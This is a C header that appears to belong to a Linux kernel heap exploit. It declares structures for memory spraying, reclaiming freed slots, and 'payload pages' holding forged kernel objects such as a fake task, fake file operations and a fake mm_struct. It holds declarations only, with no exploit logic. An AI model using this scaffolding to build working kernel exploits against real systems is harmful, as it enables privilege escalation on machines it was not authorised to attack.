#ifndef HEAP_CONTEXT_H
#define HEAP_CONTEXT_H

#include <stddef.h>
#include <stdint.h>
#include <sys/types.h>

struct kernelsnitch_shared_state;

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

typedef enum PayloadPageState {
  PAYLOAD_PAGE_EMPTY = 0,
  PAYLOAD_PAGE_CURRENT,
  PAYLOAD_PAGE_PREBUILT,
  PAYLOAD_PAGE_QUARANTINED,
} PayloadPageState;

typedef struct ReclaimPair {
  int fd[2];
} ReclaimPair;

typedef struct PayloadPage {
  uintptr_t base;
  uintptr_t last_mm_struct;
  uintptr_t fake_lock;
  uintptr_t fake_w0;
  uintptr_t fake_task;
  uintptr_t fake_parent;
  uintptr_t fake_right;
  uintptr_t fake_left;
  uintptr_t fake_fops;
  ReclaimPair reclaim;
  PayloadPageState state;
} PayloadPage;

typedef struct HeapContext {
  struct kernelsnitch_shared_state *snitch;
  size_t mm_objs_per_slab;
  unsigned char *skb_buffer;
  struct mm_ctx prepare;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  pid_t leak_child;
  int leak_memfd;
  PayloadPage current;
  PayloadPage prebuilt;
  PayloadPage quarantine;
} HeapContext;

#ifdef __cplusplus
extern HeapContext &g_heap_context;
#else
extern HeapContext g_heap_context;
#endif

void heap_context_init(HeapContext *context);
int payload_page_has_reclaim(const PayloadPage *page);
void payload_page_destroy(PayloadPage *page);
int payload_page_move(
    PayloadPage *destination, PayloadPage *source,
    PayloadPageState destination_state);

#endif
